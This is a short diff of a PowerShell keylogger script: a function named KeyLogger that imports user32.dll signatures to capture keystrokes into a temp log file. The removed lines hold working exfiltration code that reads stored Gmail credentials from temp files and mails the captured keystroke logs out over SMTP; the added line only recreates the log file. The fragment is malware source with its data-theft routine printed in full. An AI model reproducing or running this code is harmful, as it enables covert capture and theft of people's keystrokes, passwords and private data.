@@ -1,17 +1,6 @@
-
-$email = Get-Content -Path $env:temp\KHPWMpTitfZ.txt
-$password = Get-Content -Path $env:temp\oSyEZsgTWIU.txt
-
 function KeyLogger($logFilePath = "$env:temp/$env:Username.log"){
 
-    $logs = Get-Content -Path "$logFilePath"
-    $subject = "$env:UserName logs"
-    $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587")
-    $smtp.EnableSSL = $true
-    $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password)
-    $smtp.send($email, $email, $subject, $logs)
-
-    $newLogFile = New-Item -Path $logFilePath -ItemType File -Force
+    New-Item -Path $logFilePath -ItemType File -Force
 
 $APISignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
